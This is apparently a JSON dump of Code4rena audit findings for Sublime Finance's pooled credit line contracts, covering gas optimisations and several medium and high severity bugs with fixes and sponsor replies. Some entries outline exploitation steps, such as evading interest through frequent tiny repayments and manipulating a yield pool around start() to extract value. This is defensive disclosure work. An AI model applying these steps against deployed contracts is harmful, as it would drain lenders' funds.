      "github_link": "#g-02-ii-should-be-uncheckediuncheckedi-when-it-is-not-possible-for-them-to-overflow-as-is-the-case-when-used-in-for--and-while-loops",
      "tags": [],
      "finders": []
    },
    {
      "id": "4303",
      "title": "[G-12] Functions guaranteed to revert when called by normal users can be marked `payable`",
      "impact": "GAS",
      "content": "\nIf a function modifier such as `onlyOwner` is used, the function will revert if a normal user tries to pay the function. Marking the function as `payable` will lower the gas cost for legitimate callers because the compiler will not include checks for whether a payment was provided.\n\nSee [original submission](https://github.com/code-423n4/2022-03-sublime-findings/issues/36) for instances.\n\n**[ritik99 (Sublime) commented](https://github.com/code-423n4/2022-03-sublime-findings/issues/36#issuecomment-1097107013):**\n > All suggestions are valid and the report is highly detailed.\n\n\n\n***\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Sublime",
      "source_link": "https://code4rena.com/reports/2022-03-sublime",
      "github_link": "#g-12-functions-guaranteed-to-revert-when-called-by-normal-users-can-be-marked-payable",
      "tags": [],
      "finders": []
    },
    {
      "id": "4302",
      "title": "[G-11] Usage of `uints`/`ints` smaller than 32 bytes (256 bits) incurs overhead",
      "impact": "GAS",
      "content": "\n> When using elements that are smaller than 32 bytes, your contractâ€™s gas usage may be higher. This is because the EVM operates on 32 bytes at a time. Therefore, if the element is smaller than that, the EVM must use more operations in order to reduce the size of the element from 32 bytes to the desired size.\n\n<https://docs.soliditylang.org/en/v0.8.11/internals/layout_in_storage.html>\nUse a larger size then downcast where needed\n\n1.  File: contracts/Verification/twitterVerifier.sol (line [117](https://github.com/sublime-finance/sublime-v1/blob/46536a6d25df4264c1b217bd3232af30355dcb95/contracts/Verification/twitterVerifier.sol#L117))\n\n```solidity\n        uint8 _v,\n```\n\n2.  File: contracts/PooledCreditLine/PooledCreditLine.sol (line [164](https://github.com/sublime-finance/sublime-v1/blob/46536a6d25df4264c1b217bd3232af30355dcb95/contracts/PooledCreditLine/PooledCreditLine.sol#L164))\n\n```solidity\n        uint128 borrowLimit;\n```\n\n3.  File: contracts/PooledCreditLine/PooledCreditLine.sol (line [165](https://github.com/sublime-finance/sublime-v1/blob/46536a6d25df4264c1b217bd3232af30355dcb95/contracts/PooledCreditLine/PooledCreditLine.sol#L165))\n\n```solidity\n        uint128 borrowRate;\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Sublime",
      "source_link": "https://code4rena.com/reports/2022-03-sublime",
      "github_link": "#g-11-usage-of-uintsints-smaller-than-32-bytes-256-bits-incurs-overhead",
      "tags": [],
      "finders": []
    },
    {
      "id": "4301",
      "title": "[G-10] State variables should be cached in stack variables rather than re-reading them from storage",
      "impact": "GAS",
      "content": "\nThe instances below point to the second access of a state variable within a function.\nLess obvious optimizations include having local storage variables of mappings within state variable mappings or mappings within state variable structs, having local storage variables of structs within mappings, or having local caches of state variable contracts/addresses.\n\nSee [original submission](https://github.com/code-423n4/2022-03-sublime-findings/issues/36) for instances.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Sublime",
      "source_link": "https://code4rena.com/reports/2022-03-sublime",
      "github_link": "#g-10-state-variables-should-be-cached-in-stack-variables-rather-than-re-reading-them-from-storage",
      "tags": [],
      "finders": []
    },
    {
      "id": "4299",
      "title": "[G-08] Splitting `require()` statements that use `&&` saves gas",
      "impact": "GAS",
      "content": "\nSee [this issue](https://github.com/code-423n4/2022-01-xdefi-findings/issues/128) for an example\n\n1.  File: contracts/PooledCreditLine/PooledCreditLine.sol (line [642](https://github.com/sublime-finance/sublime-v1/blob/46536a6d25df4264c1b217bd3232af30355dcb95/contracts/PooledCreditLine/PooledCreditLine.sol#L642))\n\n```solidity\n        require(_request.borrowAsset != address(0) && _request.collateralAsset != address(0), 'R4');\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Sublime",
      "source_link": "https://code4rena.com/reports/2022-03-sublime",
      "github_link": "#g-08-splitting-require-statements-that-use--saves-gas",
      "tags": [],
      "finders": []
    },
    {
      "id": "4298",
      "title": "[G-07] Use a more recent version of solidity",
      "impact": "GAS",
      "content": "\nUse a solidity version of at least 0.8.0 to get overflow protection without `SafeMath`\nUse a solidity version of at least 0.8.2 to get compiler automatic inlining\nUse a solidity version of at least 0.8.3 to get better struct packing and cheaper multiple storage reads\nUse a solidity version of at least 0.8.4 to get custom errors, which are cheaper at deployment than `revert()/require()` strings\nUse a solidity version of at least 0.8.10 to have external calls skip contract existence checks if the external call has a return value\n\n1.  File: contracts/Verification/twitterVerifier.sol (line [2](https://github.com/sublime-finance/sublime-v1/blob/46536a6d25df4264c1b217bd3232af30355dcb95/contracts/Verification/twitterVerifier.sol#L2))\n\n```solidity\npragma solidity 0.7.6;\n```\n\n2.  File: contracts/PooledCreditLine/LenderPool.sol (line [2](https://github.com/sublime-finance/sublime-v1/blob/46536a6d25df4264c1b217bd3232af30355dcb95/contracts/PooledCreditLine/LenderPool.sol#L2))\n\n```solidity\npragma solidity 0.7.6;\n```\n\n3.  File: contracts/PooledCreditLine/PooledCreditLine.sol (line [2](https://github.com/sublime-finance/sublime-v1/blob/46536a6d25df4264c1b217bd3232af30355dcb95/contracts/PooledCreditLine/PooledCreditLine.sol#L2))\n\n```solidity\npragma solidity 0.7.6;\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Sublime",
      "source_link": "https://code4rena.com/reports/2022-03-sublime",
      "github_link": "#g-07-use-a-more-recent-version-of-solidity",
      "tags": [],
      "finders": []
    },
    {
      "id": "4297",
      "title": "[G-06] Multiple `if`-statements with mutually-exclusive conditions should be changed to `if`-`else` statements",
      "impact": "GAS",
      "content": "\nIf two conditions are the same, their blocks should be combined\n\n1.  File: contracts/PooledCreditLine/LenderPool.sol (lines [676-688](https://github.com/sublime-finance/sublime-v1/blob/46536a6d25df4264c1b217bd3232af30355dcb95/contracts/PooledCreditLine/LenderPool.sol#L676-L688))\n\n```solidity\n            if (from == address(0)) {\n                totalSupply[id] = totalSupply[id].add(amount);\n            } else if (to == address(0)) {\n                uint256 supply = totalSupply[id];\n                require(supply >= amount, 'T3');\n                totalSupply[id] = supply - amount;\n            } else {\n                require(pooledCLConstants[id].areTokensTransferable, 'T4');\n            }\n\n            if (from == address(0)) {\n                return;\n            }\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Sublime",
      "source_link": "https://code4rena.com/reports/2022-03-sublime",
      "github_link": "#g-06-multiple-if-statements-with-mutually-exclusive-conditions-should-be-changed-to-if-else-statements",
      "tags": [],
      "finders": []
    },
    {
      "id": "4295",
      "title": "[G-04] Using `calldata` instead of `memory` for read-only arguments in `external` functions saves gas",
      "impact": "GAS",
      "content": "\n1.  File: contracts/Verification/twitterVerifier.sol (line [88](https://github.com/sublime-finance/sublime-v1/blob/46536a6d25df4264c1b217bd3232af30355dcb95/contracts/Verification/twitterVerifier.sol#L88))\n\n```solidity\n        string memory _name,\n```\n\n2.  File: contracts/Verification/twitterVerifier.sol (line [89](https://github.com/sublime-finance/sublime-v1/blob/46536a6d25df4264c1b217bd3232af30355dcb95/contracts/Verification/twitterVerifier.sol#L89))\n\n```solidity\n        string memory _version\n```\n\n3.  File: contracts/Verification/twitterVerifier.sol (line [120](https://github.com/sublime-finance/sublime-v1/blob/46536a6d25df4264c1b217bd3232af30355dcb95/contracts/Verification/twitterVerifier.sol#L120))\n\n```solidity\n        string memory _twitterId,\n```\n\n4.  File: contracts/Verification/twitterVerifier.sol (line [121](https://github.com/sublime-finance/sublime-v1/blob/46536a6d25df4264c1b217bd3232af30355dcb95/contracts/Verification/twitterVerifier.sol#L121))\n\n```solidity\n        string memory _tweetId,\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Sublime",
      "source_link": "https://code4rena.com/reports/2022-03-sublime",
      "github_link": "#g-04-using-calldata-instead-of-memory-for-read-only-arguments-in-external-functions-saves-gas",
      "tags": [],
      "finders": []
    },
    {
      "id": "4292",
      "title": "[G-01] Multiple mappings can be combined into a single mapping of a value to a struct",
      "impact": "GAS",
      "content": "\n1.  File: contracts/PooledCreditLine/LenderPool.sol (lines [109-121](https://github.com/sublime-finance/sublime-v1/blob/46536a6d25df4264c1b217bd3232af30355dcb95/contracts/PooledCreditLine/LenderPool.sol#L109-L121))\n\n```solidity\n    /**\n     * @notice Mapping that stores constants for pooledCredit creditLine against it's id\n     */\n    mapping(uint256 => LenderPoolConstants) public pooledCLConstants;\n    /**\n     * @notice Mapping that stores variables for pooledCredit creditLine against it's id\n     */\n    mapping(uint256 => LenderPoolVariables) public pooledCLVariables;\n    /**\n     * @notice Mapping that stores total pooledCreditLine token supply against the creditLineId\n     * @dev Since ERC1155 tokens don't support the totalSupply function it is maintained here\n     */\n    mapping(uint256 => uint256) public totalSupply;\n```\n\n2.  File: contracts/PooledCreditLine/PooledCreditLine.sol (lines [184-198](https://github.com/sublime-finance/sublime-v1/blob/46536a6d25df4264c1b217bd3232af30355dcb95/contracts/PooledCreditLine/PooledCreditLine.sol#L184-L198))\n\n```solidity\n    /**\n     * @notice stores the collateral shares in a pooled credit line per collateral strategy\n     * @dev creditLineId => collateralShares\n     **/\n    mapping(uint256 => uint256) public depositedCollateralInShares;\n\n    /**\n     * @notice stores the variables to maintain a pooled credit line\n     **/\n    mapping(uint256 => PooledCreditLineVariables) public pooledCreditLineVariables;\n\n    /**\n     * @notice stores the constants related to a pooled credit line\n     **/\n    mapping(uint256 => PooledCreditLineConstants) public pooledCreditLineConstants;\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Sublime",
      "source_link": "https://code4rena.com/reports/2022-03-sublime",
      "github_link": "#g-01-multiple-mappings-can-be-combined-into-a-single-mapping-of-a-value-to-a-struct",
      "tags": [],
      "finders": []
    },
    {
      "id": "1739",
      "title": "[M-04] Interest accrued could be zero for small decimal tokens",
      "impact": "MEDIUM",
      "content": "_Submitted by hickuphh3_\n\n[PooledCreditLine.sol#L1215-L1221](https://github.com/sublime-finance/sublime-v1/blob/46536a6d25df4264c1b217bd3232af30355dcb95/contracts/PooledCreditLine/PooledCreditLine.sol#L1215-L1221)<br>\n\nInterest is calculated as\n\n```jsx\n(_principal.mul(_borrowRate).mul(_timeElapsed).div(YEAR_IN_SECONDS).div(SCALING_FACTOR));\n```\n\nIt is possible for the calculated interest to be zero for principal tokens with small decimals, such as [EURS](https://etherscan.io/token/0xdb25f211ab05b1c97d595516f45794528a807ad8) (2 decimals). Accumulated interest can therefore be zero by borrowing / repaying tiny amounts frequently.\n\n### Proof of Concept\n\nAssuming a borrow interest rate of 5% (`5e17`) and principal borrow amount of `10_000` EURS (`10_000 * 1e2 = 1_000_000`), the interest rate calculated would be 0 if principal updates are made every minute (around 63s).\n\n```jsx\n// in this example, maximum duration for interest to be 0 is 63s\n1_000_000 * 5e17 * 63 / (86400 * 365) / 1e18 = 0.99885 // = 0\n```\n\nWhile plausible, this method of interest evasion isnâ€™t as economical for tokens of larger decimals like USDC and USDT (6 decimals).\n\n### Recommended Mitigation Steps\n\nTake caution when allowing an asset to be borrowed. Alternatively, scale the principal amount to precision (1e18) amounts.\n\n**[ritik99 (Sublime) disagreed with High severity and commented](https://github.com/code-423n4/2022-03-sublime-findings/issues/10#issuecomment-1090160861):**\n > Tokens are whitelisted to ensure precision issues would not occur. Hence the issue is improbable and doesn't occur for widely used tokens as the decimals are generally higher.\n\n > Since there is no direct attack path (the steps required for this to occur would be: the token would first have to be whitelisted -> a loan request created using it -> lenders supply sufficient liquidity for this request to go active) and is, in essence, a value leak, we would suggest reducing the severity of the issue to (1) Low / (2) Medium.\n\n**[HardlyDifficult (judge) decreased severity to Medium](https://github.com/code-423n4/2022-03-sublime-findings/issues/10)**\n\n**[KushGoyal (Sublime) commented](https://github.com/code-423n4/2022-03-sublime-findings/issues/10):**\n > [LIME-286 c4march-10 interest accrued could be zero for small decimal tokens sublime-finance/sublime-v1#391](https://github.com/sublime-finance/sublime-v1/pull/391)\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about a vulnerability in the code of the Sublime Finance Pooled Credit Line contract. The issue is that interest may be calculated as zero for principal tokens with small decimals, such as EURS (2 decimals). This can be exploited by borrowers to evade interest by frequently borrowing and repaying tiny amounts. The proof of concept provided shows that with a 5% interest rate and a principal borrow amount of 10,000 EURS, the interest rate calculated would be 0 if principal updates are made every minute (around 63s). The recommended mitigation steps are to take caution when allowing an asset to be borrowed, or to scale the principal amount to precision (1e18) amounts.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Sublime",
      "source_link": "https://code4rena.com/reports/2022-03-sublime",
      "github_link": "https://github.com/code-423n4/2022-03-sublime-findings/issues/10",
      "tags": [],
      "finders": [
        "hickuphh3"
      ]
    },
    {
      "id": "1738",
      "title": "[M-03] Potentially depositing at unfavorable rate since anyone can deposit the entire lenderPool to a known strategy at a pre-fixed time",
      "impact": "MEDIUM",
      "content": "_Submitted by kyliek_\n\n[LenderPool.sol#L312](https://github.com/sublime-finance/sublime-v1/blob/46536a6d25df4264c1b217bd3232af30355dcb95/contracts/PooledCreditLine/LenderPool.sol#L312)<br>\n[LenderPool.sol#L336](https://github.com/sublime-finance/sublime-v1/blob/46536a6d25df4264c1b217bd3232af30355dcb95/contracts/PooledCreditLine/LenderPool.sol#L336)<br>\n\nAn attacker could keep track of the `totalSupply` of each LenderPool to see if it is more than the `minBorrowAmount`. If so, at `startTime`, which is pre-announced, the attacker could call `start`, which will trigger `SAVINGS_ACCOUNT.deposit()` of the entire pool assets to mint LP tokens from external strategy, for example, in CompoundYield.\n\nThere is potentially a big sum depositing into a known Compound  `cToken` contract at a known fixed time. Thus, the attacker could prepare the pool by depositing a fair sum first to lower the exchange rate before calling `start` in lenderPool. Hence, the deposit of the entire pool could be at a less favourable rate. This also applies to other potential strategies that are yet to be integrated. For example, in Curve pool, the attacker could prime the pool to be very imbalanced first and trigger the deposit and then harvest the arbitrage bonus by bringing the pool back to balance.\n\nThis attack can happen once only when the pooledCreditLine becomes active for each new lenderPool.\n\n### Proof of Concept\n\nStep 1: When a new LenderPool started, note the borrowAsset token and its strategy target pool, as well as the collection period (i.e. start time)\n\nStep 2: Closer to the start time block number, if `totalSupply` of the lenderPool is bigger than the `minBorrowAmount`, prepare a good sum to manipulate the target strategy pool for unfavorable exchange rate or arbitrage opportunity afterwords.\n\nStep 3: Call `start` function before others, also put in his own address to `_to` to pocket the protocol fee.\n\nStep 4: Depending on the strategy pool, harvest arbitrage. Or perhaps just withdraw one's money from Step 2 for griefing.\n\n### Recommended Mitigation Steps\n\nAdd access control on start, e.g. only borrower can call through pooledCreditLine.\n\n**[ritik99 (Sublime) commented](https://github.com/code-423n4/2022-03-sublime-findings/issues/64#issuecomment-1096704719):**\n > We're not sure how this leads to an attack. Fluctuation in yield is known and expected for most yield strategies like Compound. This, however, does not cause a loss of funds. An attacker instantly withdrawing their liquidity doesn't affect others because interest rates are not \"locked in\" on the yield strategies. There are no exchanges taking place. Some more info on possible attacks might help.\n\n**[HardlyDifficult (judge) commented](https://github.com/code-423n4/2022-03-sublime-findings/issues/64#issuecomment-1114990429):**\n > Followed up with the warden and there appears to be a way to leak value by debalancing the pool before start and then rebalancing to extract some profit. This could be done with a flashbot for example to limit exposure.\n> \n> The warden referenced https://github.com/yearn/yearn-security/blob/master/disclosures/2021-02-04.md as an example of something similar. \n\n**[ritik99 (Sublime) commented](https://github.com/code-423n4/2022-03-sublime-findings/issues/64#issuecomment-1129641308):**\n > Had a discussion with the warden and the judge regarding this issue. For Compound in particular we checked that the exchange rate does not change upon deposits or withdrawals. Thus, sandwiching a call to `start()` couldn't possibly lead to an attack vector. Additionally, because of another issue related to start fees #19, we decided to restrict `start()` to be callable only by the borrower.\n> \n> However, the yield strategies that we whitelist might still be internally susceptible to this attack (for eg, [https://github.com/yearn/yearn-security/blob/master/disclosures/2021-02-04.md](https://github.com/yearn/yearn-security/blob/master/disclosures/2021-02-04.md)). We'll be incorporating checks for this while onboarding strategies. Picking riskier strategies is optional and not enforced at the contract-level.\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about an attack that could potentially be used to manipulate exchange rates or take advantage of arbitrage opportunities when a new LenderPool is started. The attacker would need to keep track of the totalSupply of each LenderPool to determine if it is more than the minBorrowAmount before the start time, which is pre-announced. If so, the attacker could call the start function, which would trigger the deposit of the entire pool assets to mint LP tokens from an external strategy, such as CompoundYield. This would allow the attacker to prime the pool to be very imbalanced first and then trigger the deposit to harvest the arbitrage bonus by bringing the pool back to balance.\n\nThe recommended mitigation steps to prevent this attack include adding access control on the start function, such as only allowing the borrower to call through the pooledCreditLine.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Sublime",
      "source_link": "https://code4rena.com/reports/2022-03-sublime",
      "github_link": "https://github.com/code-423n4/2022-03-sublime-findings/issues/64",
      "tags": [],
      "finders": [
        "kyliek"
      ]
    },
    {
      "id": "1737",
      "title": "[M-02] Lack of access control allow anyone to `withdrawInterest()` for any lender",
      "impact": "MEDIUM",
      "content": "_Submitted by WatchPug_\n\n[LenderPool.sol#L442](https://github.com/sublime-finance/sublime-v1/blob/46536a6d25df4264c1b217bd3232af30355dcb95/contracts/PooledCreditLine/LenderPool.sol#L442)<br>\n\n```solidity\nfunction withdrawInterest(uint256 _id, address _lender) external nonReentrant {\n    _withdrawInterest(_id, _lender);\n}\n\nfunction _withdrawInterest(uint256 _id, address _lender) internal {\n    address _strategy = pooledCLConstants[_id].borrowAssetStrategy;\n    address _borrowAsset = pooledCLConstants[_id].borrowAsset;\n\n    (uint256 _interestToWithdraw, uint256 _interestSharesToWithdraw) = _calculateInterestToWithdraw(\n        _id,\n        _lender,\n        _strategy,\n        _borrowAsset\n    );\n    pooledCLVariables[_id].sharesHeld = pooledCLVariables[_id].sharesHeld.sub(_interestSharesToWithdraw);\n\n    if (_interestToWithdraw != 0) {\n        SAVINGS_ACCOUNT.withdraw(_borrowAsset, _strategy, _lender, _interestToWithdraw, false);\n    }\n    emit InterestWithdrawn(_id, _lender, _interestSharesToWithdraw);\n}\n```\n\n`withdrawInterest()` at a certain time may not be in the best interest of the specific `lender`.\n\nIt's unconventional and can potentially cause leak of value for the `lender`. For example, the lender may still want to accrued more interest from the strategy.\n\n### Recommended Mitigation Steps\n\nChange to:\n\n```solidity\nfunction withdrawInterest(uint256 _id, address _lender) external nonReentrant {\n    require(msg.sender == _lender);\n    _withdrawInterest(_id, _lender);\n}\n```\n\n**[ritik99 (Sublime) confirmed, but disagreed with Medium severity and commented](https://github.com/code-423n4/2022-03-sublime-findings/issues/59#issuecomment-1096697498):**\n > This is a valid suggestion. This allowed more flexibility from a composability/complexity perspective (for eg, an abstraction can be built that regularly withdraws interests for all lenders), hence the check was not put in place. We will add a check as suggested.\n> \n> Since assets are not at risk (any withdrawn amount is still transferred to the correct lender), we would suggest lowering the severity to (1) low-risk.\n\n**[HardlyDifficult (judge) commented](https://github.com/code-423n4/2022-03-sublime-findings/issues/59#issuecomment-1109952503):**\n > Agree with medium risk as this seems to potentially leak some value for the lender.\n\n**[saxenism (Sublime) commented](https://github.com/code-423n4/2022-03-sublime-findings/issues/59):**\n > [Added access control for withdrawInterest in LenderPool sublime-finance/sublime-v1#374](https://github.com/sublime-finance/sublime-v1/pull/374)\n\n\n***\n\n",
      "summary": "\nThis bug report is about a vulnerability in the code of the Sublime-v1 project. The vulnerability is in the `withdrawInterest()` function, which at a certain time may not be in the best interest of the specific `lender`. This unconventional behavior can potentially cause a leak of value for the `lender`. For example, the lender may still want to accrued more interest from the strategy. The recommendation is to change the code to add a `require` statement that the message sender must be the same as the `lender` in order to ensure that only the lender can withdraw the interest.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Sublime",
      "source_link": "https://code4rena.com/reports/2022-03-sublime",
      "github_link": "https://github.com/code-423n4/2022-03-sublime-findings/issues/59",
      "tags": [],
      "finders": [
        "WatchPug"
      ]
    },
    {
      "id": "1736",
      "title": "[M-01] Pool Credit Line May Not Able to Start When _borrowAsset is Non ERC20 Compliant Tokens",
      "impact": "MEDIUM",
      "content": "_Submitted by Meta0xNull, also found by Dravee and kenta_\n\n`IERC20(_borrowAsset).transfer(_to, _fee);`\n\nIf the USDT token is supported as \\_borrowAsset, the unsafe version of .transfer(\\_to, \\_fee) may revert as there is no return value in the USDT token contractâ€™s transfer() implementation (but the IERC20 interface expects a return value).\n\nFunction start() will break when \\_borrowAsset is USDT or Non ERC20 Compliant Tokens. USDT is one of the most borrowed Asset in DEFI. This may cause losing a lot of potential users.\n\n### Proof of Concept\n\n[LenderPool.sol#L327](https://github.com/sublime-finance/sublime-v1/blob/46536a6d25df4264c1b217bd3232af30355dcb95/contracts/PooledCreditLine/LenderPool.sol#L327)<br>\n\n### Recommended Mitigation Steps\n\nUse .safeTransfer instead of .transfer\n\n`IERC20(_borrowAsset).safeTransfer(_to, _fee);`\n\n**[ritik99 (Sublime) confirmed](https://github.com/code-423n4/2022-03-sublime-findings/issues/27)**\n\n**[saxenism (Sublime) commented](https://github.com/code-423n4/2022-03-sublime-findings/issues/27):**\n > [Shifted from transfer to safeTransfer sublime-finance/sublime-v1#372](https://github.com/sublime-finance/sublime-v1/pull/372)\n\n\n\n***\n\n",
      "summary": "\nA bug report has been submitted for the code located at https://github.com/sublime-finance/sublime-v1/blob/46536a6d25df4264c1b217bd3232af30355dcb95/contracts/PooledCreditLine/LenderPool.sol#L327. This bug affects the function start() and can cause it to break when the _borrowAsset is USDT or Non ERC20 Compliant Tokens. USDT is one of the most borrowed assets in DEFI so this bug has the potential to lose a lot of potential users. \n\nThe issue is that the function ```IERC20(_borrowAsset).transfer(_to, _fee);``` may revert as there is no return value in the USDT token contractâ€™s transfer() implementation (but the IERC20 interface expects a return value).\n\nThe recommended mitigation step is to use .safeTransfer instead of .transfer. This can be done by changing the code to ```IERC20(_borrowAsset).safeTransfer(_to, _fee);```\n\nThis bug report provides evidence that the bug exists and provides a solution to fix it. The recommended mitigation step should be taken to prevent potential loss of users.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Sublime",
      "source_link": "https://code4rena.com/reports/2022-03-sublime",
      "github_link": "https://github.com/code-423n4/2022-03-sublime-findings/issues/27",
      "tags": [],
      "finders": [
        "Dravee  kenta",
        "Meta0xNull"
      ]
    },
    {
      "id": "1735",
      "title": "[H-02] `PooledCreditLine`: termination likely fails because `_principleWithdrawable` is treated as shares",
      "impact": "HIGH",
      "content": "_Submitted by hickuphh3, also found by rayn and WatchPug_\n\n[LenderPool.sol#L404-L406](https://github.com/sublime-finance/sublime-v1/blob/46536a6d25df4264c1b217bd3232af30355dcb95/contracts/PooledCreditLine/LenderPool.sol#L404-L406)<br>\n\n`_principalWithdrawable` is denominated in the borrowAsset, but subsequently treats it as the share amount to be withdrawn.\n\n```jsx\n// _notBorrowed = borrowAsset amount that isn't borrowed\n// totalSupply[_id] = ERC1155 total supply of _id\n// _borrowedTokens = borrower's specified borrowLimit\nuint256 _principalWithdrawable = _notBorrowed.mul(totalSupply[_id]).div(_borrowedTokens);\n\nSAVINGS_ACCOUNT.withdrawShares(_borrowAsset, _strategy, _to, _principalWithdrawable.add(_totalInterestInShares), false);\n```\n\n### Recommended Mitigation Steps\n\nThe amount of shares to withdraw can simply be `_sharesHeld`.\n\nNote that this comes with the assumption that `terminate()` is only called when the credit line is `ACTIVE` or `EXPIRED` (consider ensuring this condition on-chain), because `_sharesHeld` **excludes principal withdrawals,** so the function will fail once a lender withdraws his principal.\n\n```jsx\nfunction terminate(uint256 _id, address _to) external override onlyPooledCreditLine nonReentrant {\n  address _strategy = pooledCLConstants[_id].borrowAssetStrategy;\n  address _borrowAsset = pooledCLConstants[_id].borrowAsset;\n  uint256 _sharesHeld = pooledCLVariables[_id].sharesHeld;\n\n  SAVINGS_ACCOUNT.withdrawShares(_borrowAsset, _strategy, _to, _sharesHeld, false);\n  delete pooledCLConstants[_id];\n  delete pooledCLVariables[_id];\n}\n```\n\n**[ritik99 (Sublime) confirmed](https://github.com/code-423n4/2022-03-sublime-findings/issues/21)**\n\n\n\n***\n \n",
      "summary": "\nA bug was found in the LenderPool.sol contract, which is part of the Sublime Finance project. This bug can be found in lines 404-406 of the contract. The bug causes the `_principalWithdrawable` variable to be denominated in the borrowAsset, but it is then treated as the share amount to be withdrawn. This bug can have a significant impact on the project and should be fixed.\n\nThe recommended mitigation steps are to use `_sharesHeld` as the amount of shares to withdraw, instead of `_principalWithdrawable`. However, it is important to note that `terminate()` should only be called when the credit line is `ACTIVE` or `EXPIRED`, as `_sharesHeld` excludes principal withdrawals. The code for this can be seen below.\n\n```jsx\nfunction terminate(uint256 _id, address _to) external override onlyPooledCreditLine nonReentrant {\n  address _strategy = pooledCLConstants[_id].borrowAssetStrategy;\n  address _borrowAsset = pooledCLConstants[_id].borrowAsset;\n  uint256 _sharesHeld = pooledCLVariables[_id].sharesHeld;\n\n  SAVINGS_ACCOUNT.withdrawShares(_borrowAsset, _strategy, _to, _sharesHeld, false);\n  delete pooledCLConstants[_id];\n  delete pooledCLVariables[_id];\n}\n```\n\nIn summary, a bug was found in the LenderPool.sol contract of the Sublime Finance project, which can have a significant impact. The bug causes the `_principalWithdrawable` variable to be denominated in the borrowAsset, but it is then treated as the share amount to be withdrawn. The recommended mitigation steps are to use `_sharesHeld` as the amount of shares to withdraw, but it is important to ensure that `terminate()` is only called when the credit line is `ACTIVE` or `EXPIRED`.",
      "quality_score": 1,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Sublime",
      "source_link": "https://code4rena.com/reports/2022-03-sublime",
      "github_link": "https://github.com/code-423n4/2022-03-sublime-findings/issues/21",
      "tags": [],
      "finders": [
        "hickuphh3",
        "rayn  WatchPug"
      ]
    },
    {
      "id": "1734",
      "title": "[H-01] `LenderPool`: Principal withdrawable is incorrectly calculated if start() is invoked with non-zero start fee",
      "impact": "HIGH",
      "content": "_Submitted by hickuphh3_\n\n[LenderPool.sol#L594-L599](https://github.com/sublime-finance/sublime-v1/blob/46536a6d25df4264c1b217bd3232af30355dcb95/contracts/PooledCreditLine/LenderPool.sol#L594-L599)<br>\n[LenderPool.sol#L399-L404](https://github.com/sublime-finance/sublime-v1/blob/46536a6d25df4264c1b217bd3232af30355dcb95/contracts/PooledCreditLine/LenderPool.sol#L399-L404)<br>\n\nThe `_principalWithdrawable` calculated will be more than expected if `_start()` is invoked with a non-zero start fee, because the borrow limit is reduced by the fee, resulting in `totalSupply[id]` not being 1:1 with the borrow limit.\n\n```jsx\nfunction _calculatePrincipalWithdrawable(uint256 _id, address _lender) internal view returns (uint256) {\n  uint256 _borrowedTokens = pooledCLConstants[_id].borrowLimit;\n  uint256 _totalLiquidityWithdrawable = _borrowedTokens.sub(POOLED_CREDIT_LINE.getPrincipal(_id));\n  uint256 _principalWithdrawable = _totalLiquidityWithdrawable.mul(balanceOf(_lender, _id)).div(_borrowedTokens);\n  return _principalWithdrawable;\n}\n```\n\n### Proof of Concept\n\nAssume the following conditions:\n\n*   Alice, the sole lender, provided `100_000` tokens: `totalSupply[_id] = 100_000`\n*   `borrowLimit = 99_000` because of a 1% startFee\n*   Borrower borrowed zero amount\n\nWhen Alice attempts to withdraw her tokens, the `_principalWithdrawable` amount is calculated as\n\n```jsx\n_borrowedTokens = 99_000\n_totalLiquidityWithdrawable = 99_000 - 0 = 99_000\n_principalWithdrawable = 99_000 * 100_000 / 99_000 = 100_000\n```\n\nThis is more than the available principal amount of `99_000`, so the withdrawal will fail.\n\n### Recommended Mitigation Steps\n\nOne hack-ish way is to save the initial supply in `minBorrowAmount` (perhaps rename the variable to `minInitialSupply`) when the credit line is accepted, and replace `totalSupply[_id]` with it.\n\nThe other places where `minBorrowAmount` are used will not be affected by the change because:\n\n*   startTime has been zeroed, so `start()` cannot be invoked (revert with error S1)\n*   credit line status would have been changed to `ACTIVE` and cannot be changed back to `REQUESTED`, meaning the check below will be false regardless of the value of `minBorrowAmount`.\n\n    ```jsx\n    _status == PooledCreditLineStatus.REQUESTED &&\n    block.timestamp > pooledCLConstants[_id].startTime &&\n    totalSupply[_id] < pooledCLConstants[_id].minBorrowAmount\n    ```\n\nCode amendment example:\n\n```jsx\n\nfunction _accept(uint256 _id, uint256 _amount) internal {\n  ...\n  // replace delete pooledCLConstants[_id].minBorrowAmount; with the following:\n  pooledCLConstants[_id].minInitialSupply = totalSupply[_id];\n}\n\n// update comment in _withdrawLiquidity\n// Case 1: Pooled credit line never started because desired amount wasn't reached\n// state will never revert back to REQUESTED if credit line is accepted so this case is never run\n\nfunction _calculatePrincipalWithdrawable(uint256 _id, address _lender) internal view returns (uint256) {\n  uint256 _borrowedTokens = pooledCLConstants[_id].borrowLimit;\n  uint256 _totalLiquidityWithdrawable = _borrowedTokens.sub(POOLED_CREDIT_LINE.getPrincipal(_id));\n  // totalSupply[id] replaced with minInitialSupply\n  uint256 _principalWithdrawable = 